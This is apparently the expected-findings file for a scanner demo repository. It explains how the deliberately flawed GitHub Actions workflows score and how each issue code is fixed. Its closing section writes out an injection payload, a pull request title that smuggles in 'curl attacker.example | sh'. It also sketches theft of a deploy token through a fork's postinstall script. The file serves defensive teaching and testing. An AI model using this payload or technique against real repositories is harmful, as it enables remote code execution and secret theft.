# Expected Plumber findings

Run from the repo root (GitHub auth via `gh` recommended so the run completes
and shows a letter score):

```bash
plumber analyze --score-point
```

Verified with Plumber CLI 0.6.0: **3 / 100 (E)**, six attack paths and one
individual finding. Eleven issue codes fire across `ci.yml`, `deploy.yml` and
`preview.yml`; `plumber.yml` (the scoring workflow itself) is clean. The
`.plumber.yaml` overlay tightens two controls: an action is not trusted for
sharing our GitHub org (`ISSUE-713`), and `actions/*` is not exempt from the
commit-SHA pin rule (`ISSUE-701` on every `@v4`).

The score depends on repository settings too. The numbers in this file assume
the state the demo run sheet describes: a **public** repository with a
**protected** `main`. With the repository private and `main` unprotected, the
same workflows score **16 / 100 (E)**: `ISSUE-501` (branch protection missing)
adds a High path, and the two script-injection paths drop from High to Medium
because fewer people can open a pull request.

## Attack paths (scored as paths, not as individual findings)

| Path | Severity | Entry | What it reaches | Codes on the path |
| --- | --- | --- | --- | --- |
| 1 | **Critical** | `github.event.pull_request.head.sha` checked out in `preview.yml` (on `pull_request_target`) | `FLY_API_TOKEN`, a token with `pull-requests: write`, a deploy step | `ISSUE-804` |
| 2 | High | `getplumber-examples/totally-fine-action@v1` (untrusted, mutable) | Every secret, a write-all token, an OIDC token | `ISSUE-701`, `ISSUE-713`, `ISSUE-309`, `ISSUE-803`, `ISSUE-203` |
| 3 | High | `github.head_ref` injected in a script | Code execution on the runner | `ISSUE-209` |
| 4 | High | `github.event.pull_request.title` injected in a script | Code execution on the runner | `ISSUE-207` |
| 5 | Medium | `actions/checkout@v4` (mutable) in five jobs | Every secret, write token, deploy | `ISSUE-701`, `ISSUE-307`, `ISSUE-801` |
| 6 | Medium | `actions/setup-node@v4` (mutable) in three jobs | Every secret, write token, deploy | `ISSUE-701` |

Path 1 is the only Critical: a fork opens a PR, `preview.yml` checks out the
fork's commit under `pull_request_target`, and `npm ci` runs the fork's
`package.json` lifecycle scripts with the deploy token in scope. Path 2 is
capped at High because the dependency has to be compromised first (and
`ISSUE-713` says its source is not authorized). Paths 3 and 4 are High rather
than Critical because a `pull_request` run from a fork only carries a read-only
token. Paths 5 and 6 are capped at Medium: GitHub-owned, but still a mutable
tag that a compromise of the `actions` org could repoint.

## Individual findings

| Code | Severity | Control | Where | The fix |
| --- | --- | --- | --- | --- |
| `ISSUE-302` | High | Reusable workflows must not inherit secrets | `deploy` job calls `deploy.yml` with `secrets: inherit` | Forward named secrets explicitly |

## Every code, and its fix

| Code | Severity | Where | The fix |
| --- | --- | --- | --- |
| `ISSUE-804` | Critical | `preview.yml` checks out `${{ github.event.pull_request.head.sha }}` under `pull_request_target` | Run on `pull_request` instead, or never check out the PR head in a privileged workflow |
| `ISSUE-203` | Critical | `coverage` job sets `ACTIONS_STEP_DEBUG: true` | Remove the debug variable |
| `ISSUE-207` | Critical | `coverage` job echoes `${{ github.event.pull_request.title }}` in a `run:` script | Pass the value through an `env:` variable and quote it |
| `ISSUE-309` | Critical | `coverage` job sets `ALL_SECRETS: ${{ toJSON(secrets) }}` | Pass only the secrets a step needs, by name |
| `ISSUE-209` | High | `coverage` job writes `${{ github.head_ref }}` into `$GITHUB_ENV` | Pass the value through an `env:` variable |
| `ISSUE-302` | High | `deploy` job calls `deploy.yml` with `secrets: inherit` | Forward named secrets explicitly |
| `ISSUE-701` | High / Medium | `totally-fine-action@v1` (High); `actions/checkout@v4` and `actions/setup-node@v4` in every job (Medium) | Pin each to a commit SHA with a `# vX.Y.Z` comment |
| `ISSUE-713` | High | `totally-fine-action` is not an authorized source | Policy decision: allowlist the owner in `.plumber.yaml` or vendor the action |
| `ISSUE-803` | High | `coverage` job sets `permissions: write-all` | Grant only the scopes the job needs |
| `ISSUE-801` | Medium | `image` job declares no `permissions:` | Declare the minimal block |
| `ISSUE-307` | Low | `image` job checkout keeps credentials | `persist-credentials: false` |

## What the Plumber agent fixes

Every code above except `ISSUE-713` has a repair path in the Plumber agent:

- Deterministic resolvers, no model call: `ISSUE-701` (pin every tag to its
  SHA, nine occurrences), `ISSUE-309` (named secrets), `ISSUE-302` (explicit
  secret mapping), `ISSUE-803` and `ISSUE-801` (minimal `permissions:` block).
- Model-proposed, oracle-verified: `ISSUE-804` (guard the privileged trigger),
  `ISSUE-207` and `ISSUE-209` (bind the untrusted value through `env:`),
  `ISSUE-307` (add `persist-credentials: false`), `ISSUE-203` (delete the
  debug variable).
- `ISSUE-713` is a policy decision, not an auto-fix.

## How the attack chains together

`ISSUE-309` hands every repository secret to the `coverage` job's environment.
`ISSUE-803` gives that job write access to the whole repository. `ISSUE-701`
lets a third-party action run there, trusted by a mutable tag that an attacker
can repoint. `ISSUE-203` makes sure the leaked material also lands in the logs.
`ISSUE-302` then forwards the same secrets into a second workflow. Each finding
is a rung; together they are the ladder.

`ISSUE-207` and `ISSUE-209` open a second door that needs no compromised
dependency at all: a pull request titled `"; curl attacker.example | sh #`
runs on the same job.

`ISSUE-804` is the third door, and the widest. A fork does not need to touch
the workflow at all: it edits `package.json` to add a `postinstall` script,
opens a pull request, and `preview.yml` runs that script with `FLY_API_TOKEN`
in the environment before any human looks at the diff.

The `coverage` step runs
[`getplumber-examples/totally-fine-action`](https://github.com/getplumber-examples/totally-fine-action),
which is built to behave like a supply-chain-compromised action.
